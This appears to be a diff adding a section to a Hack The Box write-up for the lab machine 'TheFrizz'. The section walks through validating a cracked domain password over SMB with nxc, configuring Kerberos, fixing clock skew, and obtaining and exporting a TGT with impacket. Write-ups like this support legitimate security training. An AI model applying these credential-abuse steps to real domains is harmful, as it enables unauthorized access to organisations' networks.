@@ -141,3 +141,54 @@ Run Hashcat:
 ---
 
 ## Privelage Escalation
+### Credential Validation
+With the cracked password for f.frizzle, first validate the credentials against SMB.  
+`nxc smb frizzdc.frizz.htb -u f.frizzle -p 'Jenni_Luvs_Magic23'`
+The authentication succeeds, confirming the credentials are valid domain credentials.
+![](assets/img/htb/thefrizz/validatecreds.png)
+
+### Kerberos Configuration
+To use Kerberos authentication, the local system must be configured for the FRIZZ.HTB realm. The /etc/krb5.conf file is modified to define the domain controller as the Key Distribution Center (KDC).  
+`sudo nano /etc/krb5.conf`
+```shell
+[libdefaults]
+    default_realm = FRIZZ.HTB
+    dns_lookup_realm = false
+    dns_lookup_kdc = true
+    ticket_lifetime = 24h
+    forwardable = true
+
+[realms]
+FRIZZ.HTB = {
+    kdc = frizzdc.frizz.htb
+    admin_server = frizzdc.frizz.htb
+    default_domain = frizz.htb
+}
+
+[domain_realm]
+.frizz.htb = FRIZZ.HTB
+frizz.htb = FRIZZ.HTB
+
+```
+This ensures Kerberos requests are directed to the correct domain controller.
+![](assets/img/htb/thefrizz/krb5.png)
+
+### Kerberos Authentication
+Since this is a domain controller and NTLM authentication is restricted, the next step is to obtain a Kerberos Ticket Granting Ticket (TGT). Kerberos is the native authentication mechanism in Active Directory and will allow authenticated access to domain services such as LDAP and SMB. An initial attempt to request a TGT results in:  
+`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`
+![](assets/img/htb/thefrizz/clockskew.png)
+
+Kerberos requires synchronized system time. The earlier Nmap scan indicated clock skew. Synchronize time with the domain controller:  
+`sudo ntpdate frizzdc.frizz.htb`
+![](assets/img/htb/thefrizz/ntpupdate.png)
+
+Request a TGT:  
+`impacket-getTGT frizz.htb/f.frizzle:Jenni_Luvs_Magic23 -dc-ip 10.129.232.168`
+![](assets/img/htb/thefrizz/savingticket.png)
+
+Export the ticket:  
+`export KRB5CCNAME=f.frizzle.ccache`
+![](assets/img/htb/thefrizz/export.png)
+
+Verify with `klist`. Kerberos authentication is now established for f.frizzle.
+![](assets/img/htb/thefrizz/klist.png)
